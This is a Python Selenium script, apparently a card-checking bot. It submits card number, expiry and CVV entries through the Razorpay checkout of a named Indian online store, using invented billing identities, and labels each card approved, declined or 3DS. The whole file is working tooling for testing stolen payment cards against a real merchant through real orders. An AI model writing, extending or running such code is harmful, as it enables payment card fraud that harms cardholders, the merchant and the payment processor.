#!/usr/bin/env python3
"""
Razorpay Bot - Clean Implementation
Following exact 3 steps as instructed
"""

import subprocess
import sys
import os

# Force unbuffered output
os.environ['PYTHONUNBUFFERED'] = '1'
sys.stdout.reconfigure(line_buffering=True)
sys.stderr.reconfigure(line_buffering=True)

def install_package(package):
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet", "--break-system-packages"])
    except:
        pass

required_packages = ['selenium', 'faker']
for package in required_packages:
    try:
        __import__(package)
    except ImportError:
        install_package(package)

from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import Select
import re
import time
import random
from faker import Faker
import os

def extract_card(text):
    match = re.search(r'(\d{12,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})', text)
    if match:
        return f"{match.group(1)}|{match.group(2)}|{match.group(3)}|{match.group(4)}"
    return None

def generate_fake_address():
    fake = Faker('en_IN')
    first_names = ['Rahul', 'Amit', 'Priya', 'Sneha', 'Vikram']
    last_names = ['Sharma', 'Kumar', 'Singh', 'Patel', 'Gupta']
    idx = random.randint(0, len(first_names) - 1)
    
    return {
        'first_name': first_names[idx],
        'last_name': last_names[idx],
        'email': f"{first_names[idx].lower()}.{last_names[idx].lower()}{random.randint(100, 999)}@gmail.com",
        'phone': f"9{random.randint(100000000, 999999999)}",
        'address': fake.street_address(),
        'city': 'Mumbai',
        'state': 'MH',
        'pincode': f"{random.randint(400000, 400099)}"
    }

def setup_driver():
    chrome_options = Options()
    chrome_options.add_argument('--headless')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--window-size=1920,1080')
    
    driver = webdriver.Chrome(options=chrome_options)
    driver.set_page_load_timeout(30)
    return driver

def check_razorpay_card_sync(card_data):
    start_time = time.time()
    driver = None
    
    print(f"\n{'='*50}")
    print(f"Starting check for: {card_data}")
    print(f"{'='*50}\n")
    
    try:
        parts = card_data.split('|')
        if len(parts) < 4:
            return {'status': 'error', 'message': 'Invalid card format', 'time': f'{round(time.time() - start_time, 2)}s', 'screenshot': None}
        
        cc, mes, ano, cvv = parts[0], parts[1], parts[2], parts[3]
        if len(ano) == 2:
            ano = f"20{ano}"
        if len(mes) == 1:
            mes = f"0{mes}"
        
        fake_address = generate_fake_address()
        driver = setup_driver()
        wait = WebDriverWait(driver, 20)
        
        # STEP 1: Product Page -> Click "Buy Now"
        print("\n[STEP 1] Product page -> Buy Now")
        driver.get("https://etradus.in/product/computer-software/npav-antivirus-total-security/")
        print(f"✓ Page loaded: {driver.current_url}")
        time.sleep(2)
        
        buy_now = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "button[name='add-to-cart']")))
        buy_now.click()
        print("✓ Buy Now clicked")
        time.sleep(2)
        
        # STEP 2: Cart Page -> Click "Proceed to Checkout"
        print("\n[STEP 2] Cart -> Proceed to Checkout")
        driver.get("https://etradus.in/cart/")
        print(f"✓ Cart page: {driver.current_url}")
        time.sleep(2)
        
        checkout_btn = wait.until(EC.element_to_be_clickable((By.CSS_SELECTOR, "a.checkout-button")))
        checkout_btn.click()
        print("✓ Checkout clicked")
        time.sleep(2)
        
        # STEP 3: Checkout Page -> Fill details -> Place Order
        print("\n[STEP 3] Checkout -> Fill & Place Order")
        print(f"✓ Checkout page: {driver.current_url}")
        wait.until(EC.presence_of_element_located((By.ID, "billing_first_name")))
        print("✓ Billing form loaded")
        
        driver.find_element(By.ID, "billing_first_name").send_keys(fake_address['first_name'])
        driver.find_element(By.ID, "billing_last_name").send_keys(fake_address['last_name'])
        driver.find_element(By.ID, "billing_email").send_keys(fake_address['email'])
        driver.find_element(By.ID, "billing_phone").send_keys(fake_address['phone'])
        driver.find_element(By.ID, "billing_address_1").send_keys(fake_address['address'])
        driver.find_element(By.ID, "billing_city").send_keys(fake_address['city'])
        
        state_select = Select(driver.find_element(By.ID, "billing_state"))
        state_select.select_by_value("MH")
        
        driver.find_element(By.ID, "billing_postcode").send_keys(fake_address['pincode'])
        print("✓ All fields filled")
        
        # Agree to terms
        try:
            terms = driver.find_element(By.ID, "terms")
            if not terms.is_selected():
                driver.execute_script("arguments[0].click();", terms)
                print("✓ Terms accepted")
        except:
            print("⚠ Terms checkbox not found")
        
        time.sleep(1)
        
        # Place Order
        print("\nClicking Place Order...")
        place_order = driver.find_element(By.ID, "place_order")
        driver.execute_script("arguments[0].scrollIntoView(true);", place_order)
        time.sleep(1)
        
        # Try multiple times to click
        for attempt in range(3):
            try:
                driver.execute_script("arguments[0].click();", place_order)
                print(f"✓ Place Order clicked (attempt {attempt + 1})")
                break
            except Exception as e:
                print(f"⚠ Click failed (attempt {attempt + 1}): {e}")
                time.sleep(1)
        
        # Wait for Razorpay iframe to load
        print("\n[STEP 4] Waiting for Razorpay...")
        time.sleep(10)
        print(f"✓ Current URL: {driver.current_url}")
        
        # Check if still on checkout page
        if 'checkout' in driver.current_url and 'order-pay' not in driver.current_url:
            print("❌ Still on checkout page - Place Order failed!")
            return {'status': 'error', 'message': 'Place Order button failed', 'time': f'{round(time.time() - start_time, 2)}s', 'screenshot': None}
        
        # Switch to Razorpay iframe
        print("\n[STEP 5] Looking for Razorpay iframe...")
        iframes = driver.find_elements(By.TAG_NAME, "iframe")
        print(f"✓ Found {len(iframes)} iframes")
        
        razorpay_found = False
        for i, iframe in enumerate(iframes):
            try:
                driver.switch_to.frame(iframe)
                if "razorpay" in driver.page_source.lower():
                    print(f"✓ Razorpay iframe found (index {i})")
                    razorpay_found = True
                    break
                driver.switch_to.default_content()
            except:
                driver.switch_to.default_content()
        
        if not razorpay_found:
            print("❌ Razorpay iframe not found!")
            return {'status': 'error', 'message': 'Razorpay iframe not found', 'time': f'{round(time.time() - start_time, 2)}s', 'screenshot': None}
        
        time.sleep(3)
        
        # Click "Cards" option
        print("\n[STEP 6] Clicking Cards option...")
        cards_clicked = False
        
        # Try finding "Cards" text
        all_elements = driver.find_elements(By.XPATH, "//*[contains(text(), 'Cards') or contains(text(), 'Card')]")
        for elem in all_elements:
            try:
                elem_text = elem.text.strip()
                if elem_text == 'Cards' and elem.is_displayed():
                    driver.execute_script("arguments[0].click();", elem)
                    print(f"✓ Cards clicked: {elem_text}")
                    cards_clicked = True
                    time.sleep(2)
                    break
            except Exception as e:
                print(f"⚠ Failed to click: {e}")
        
        if not cards_clicked:
            print("⚠ Cards option not found, trying alternative...")
            # Try clicking any element with "card" in class or id
            try:
                card_divs = driver.find_elements(By.CSS_SELECTOR, "[class*='card'], [id*='card']")
                for div in card_divs:
                    if div.is_displayed() and 'Cards' in div.text:
                        driver.execute_script("arguments[0].click();", div)
                        print("✓ Cards clicked (alternative)")
                        cards_clicked = True
                        time.sleep(2)
                        break
            except:
                pass
        
        if not cards_clicked:
            print("❌ Could not click Cards option!")
        
        # Fill card details
        print("\n[STEP 7] Filling card details...")
        time.sleep(2)
        
        # Card number
        card_filled = False
        for attempt in range(10):
            try:
                card_field = driver.find_element(By.CSS_SELECTOR, "input[placeholder*='Card'], input[type='tel']")
                if card_field.is_displayed():
                    card_field.send_keys(cc)
                    print("✓ Card number filled")
                    card_filled = True
                    break
            except:
                time.sleep(1)
        
        if not card_filled:
            print("❌ Card field not found!")
            return {'status': 'error', 'message': 'Card field not found', 'time': f'{round(time.time() - start_time, 2)}s', 'screenshot': None}
        
        time.sleep(1)
        
        # Expiry
        expiry_filled = False
        try:
            expiry_field = driver.find_element(By.CSS_SELECTOR, "input[placeholder*='MM']")
            expiry_field.send_keys(f"{mes}{ano[-2:]}")
            print("✓ Expiry filled")
            expiry_filled = True
        except:
            print("⚠ Expiry field not found")
        
        time.sleep(1)
        
        # CVV
        cvv_filled = False
        try:
            cvv_field = driver.find_element(By.CSS_SELECTOR, "input[placeholder*='CVV']")
            cvv_field.send_keys(cvv)
            print("✓ CVV filled")
            cvv_filled = True
        except:
            print("⚠ CVV field not found")
        
        time.sleep(2)
        
        # Click Continue
        print("\n[STEP 8] Looking for Continue button...")
        continue_clicked = False
        buttons = driver.find_elements(By.TAG_NAME, "button")
        for btn in buttons:
            try:
                if btn.is_displayed() and 'continue' in btn.text.lower():
                    driver.execute_script("arguments[0].click();", btn)
                    print("✓ Continue clicked")
                    continue_clicked = True
                    break
            except:
                pass
        
        if not continue_clicked:
            print("⚠ Continue button not found")
        
        # STEP 9: Currency selection popup
        print("\n[STEP 9] Waiting for currency selection...")
        time.sleep(3)
        
        currency_clicked = False
        for attempt in range(5):
            try:
                # Look for "Pay" button with currency symbol
                buttons = driver.find_elements(By.TAG_NAME, "button")
                for btn in buttons:
                    try:
                        btn_text = btn.text
                        if btn.is_displayed() and 'pay' in btn_text.lower() and ('€' in btn_text or '$' in btn_text or '₹' in btn_text):
                            driver.execute_script("arguments[0].click();", btn)
                            print(f"✓ Currency Pay button clicked: {btn_text}")
                            currency_clicked = True
                            time.sleep(2)
                            break
                    except:
                        pass
                
                if currency_clicked:
                    break
            except:
                pass
            
            time.sleep(1)
        
        if not currency_clicked:
            print("⚠ Currency Pay button not found")
        
        # STEP 10: Click "Maybe later" popup
        print("\n[STEP 10] Waiting for Maybe later popup...")
        time.sleep(3)
        
        maybe_clicked = False
        for attempt in range(5):
            try:
                # Look for "Maybe later" button
                buttons = driver.find_elements(By.TAG_NAME, "button")
                for btn in buttons:
                    try:
                        btn_text = btn.text
                        if btn.is_displayed() and ('maybe' in btn_text.lower() or 'later' in btn_text.lower()):
                            driver.execute_script("arguments[0].click();", btn)
                            print(f"✓ Maybe later clicked: {btn_text}")
                            maybe_clicked = True
                            time.sleep(2)
                            break
                    except:
                        pass
                
                if maybe_clicked:
                    break
            except:
                pass
            
            time.sleep(1)
        
        if not maybe_clicked:
            print("⚠ Maybe later button not found")
        
        # STEP 11: Check for result
        print("\n[STEP 11] Checking for result...")
        time.sleep(5)
        
        # Check if new window opened (3DS authentication)
        current_windows = driver.window_handles
        print(f"✓ Windows count: {len(current_windows)}")
        
        screenshot_path = f'/workspaces/mr.ak-s-a-/screenshots/result_{int(time.time())}.png'
        os.makedirs('/workspaces/mr.ak-s-a-/screenshots', exist_ok=True)
        
        # Check if new window opened (3DS card)
        if len(current_windows) > 1:
            print("🔐 3DS Authentication window detected!")
            print(f"✓ Switching to new window (index {len(current_windows)-1})...")
            
            # Switch to new window
            driver.switch_to.window(current_windows[-1])
            time.sleep(3)
            
            print(f"✓ New window URL: {driver.current_url}")
            
            # Take screenshot of 3DS page
            try:
                driver.save_screenshot(screenshot_path)
                print(f"📸 3DS Screenshot saved: {screenshot_path}")
            except Exception as e:
                print(f"⚠ Screenshot failed: {e}")
            
            return {'status': '3ds', 'message': '3DS Authentication Required', 'time': f'{round(time.time() - start_time, 2)}s', 'screenshot': screenshot_path}
        
        # Non-3DS card - check for result in iframe
        print("Checking for result in Razorpay iframe...")
        result_found = False
        result_status = 'declined'
        result_message = 'Payment failed'
        
        for i in range(10):
            time.sleep(2)
            
            try:
                driver.switch_to.default_content()
            except:
                pass
            
            # Check URL for success
            current_url = driver.current_url
            if 'order-received' in current_url:
                result_status = 'approved'
                result_message = 'Payment successful'
                result_found = True
                break
            
            # Check inside Razorpay iframe
            try:
                iframes = driver.find_elements(By.TAG_NAME, "iframe")
                if len(iframes) > 0:
                    driver.switch_to.frame(iframes[0])
                    iframe_source = driver.page_source.lower()
                    
                    # Check for success
                    if 'success' in iframe_source or 'approved' in iframe_source:
                        result_status = 'approved'
                        result_message = 'Payment successful'
                        result_found = True
                        break
                    
                    # Check for decline
                    if 'declined' in iframe_source or 'failed' in iframe_source:
                        result_status = 'declined'
                        result_message = 'Card declined'
                        result_found = True
                        break
                    
                    # Check for insufficient funds
                    if 'insufficient' in iframe_source:
                        result_status = 'declined'
                        result_message = 'Insufficient funds'
                        result_found = True
                        break
                    
                    # Check for invalid card
                    if 'invalid' in iframe_source or 'incorrect' in iframe_source:
                        result_status = 'declined'
                        result_message = 'Invalid card'
                        result_found = True
                        break
                    
                    driver.switch_to.default_content()
            except:
                pass
            
            if result_found:
                break
        
        # Take final screenshot
        try:
            driver.switch_to.default_content()
            driver.save_screenshot(screenshot_path)
            print(f"📸 Screenshot: {screenshot_path}")
        except:
            screenshot_path = None
        
        return {'status': result_status, 'message': result_message, 'time': f'{round(time.time() - start_time, 2)}s', 'screenshot': screenshot_path}
        
    except Exception as e:
        screenshot_path = f'/workspaces/mr.ak-s-a-/screenshots/error_{int(time.time())}.png'
        try:
            if driver:
                driver.save_screenshot(screenshot_path)
        except:
            screenshot_path = None
        
        return {'status': 'error', 'message': f'Error: {str(e)[:100]}', 'time': f'{round(time.time() - start_time, 2)}s', 'screenshot': screenshot_path}
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass

def main():
    print("=" * 60)
    print("🚀 Razorpay Clean Bot - Terminal Version")
    print("=" * 60)
    
    while True:
        print("\nEnter card details (format: 4532015112830366|12|2025|123)")
        print("Type 'exit' to quit")
        
        user_input = input("\n> ").strip()
        
        if user_input.lower() == 'exit':
            print("Exiting...")
            break
        
        card = extract_card(user_input)
        
        if not card:
            print("❌ Invalid card format!")
            print("Format: 4532015112830366|12|2025|123")
            continue
        
        print(f"\nProcessing card: {card}")
        print("Please wait...\n")
        
        result = check_razorpay_card_sync(card)
        
        status = result.get('status', 'error')
        message = result.get('message', 'Unknown error')
        time_taken = result.get('time', '0s')
        screenshot_path = result.get('screenshot')
        
        if status == 'approved':
            status_emoji = "✅"
            status_text = "APPROVED"
        elif status == 'declined':
            status_emoji = "❌"
            status_text = "DECLINED"
        elif status == '3ds':
            status_emoji = "🔐"
            status_text = "3DS AUTHENTICATION"
        else:
            status_emoji = "⚠️"
            status_text = "ERROR"
        
        print("\n" + "=" * 50)
        print(f"{status_emoji} Razorpay Result")
        print("=" * 50)
        print(f"Card: {card}")
        print(f"Status: {status_text}")
        print(f"Response: {message}")
        print(f"Time: {time_taken}")
        print(f"Gateway: Razorpay (Selenium)")
        print(f"Site: etradus.in")
        
        if screenshot_path and os.path.exists(screenshot_path):
            print(f"Screenshot saved: {screenshot_path}")
        print("=" * 50)

if __name__ == "__main__":
    main()